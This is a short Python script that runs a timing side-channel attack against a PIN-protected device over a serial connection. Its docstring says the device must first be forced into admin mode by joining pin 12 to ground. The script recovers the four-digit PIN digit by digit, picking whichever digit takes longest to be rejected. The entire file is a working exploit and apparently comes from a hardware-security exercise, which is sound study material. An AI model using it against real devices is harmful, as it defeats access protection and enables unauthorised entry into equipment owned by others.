"""Timing attack on PIN.

To make it work we need to get into admin mode by joining PIN 12 with GND.
"""
import time
import operator

import serial


def main():
  with serial.Serial('/dev/cu.usbserial-142210', 9600, timeout=1) as ser:

    for _ in range(2):
      ser.write(b'aaa')
      ser.read(28)

    prefix = b''

    attack_start = time.time()

    suffixes = (b'0' * size for size in range(3, -1, -1))
    for suffix in suffixes:
      times = {}

      for idx in map(str, range(10)):
        value = prefix + idx.encode('utf-8') + suffix
        print(value, end='\r', flush=True)
        ser.write(value)
        start = time.time()
        ser.read(28)
        times[idx] = time.time() - start

      number = max(times.keys(), key=lambda e: times[e])

      prefix += number.encode('utf-8')


  print(f'{prefix.decode()} found in {time.time() - attack_start:.4}s.')


if __name__ == "__main__":
  main()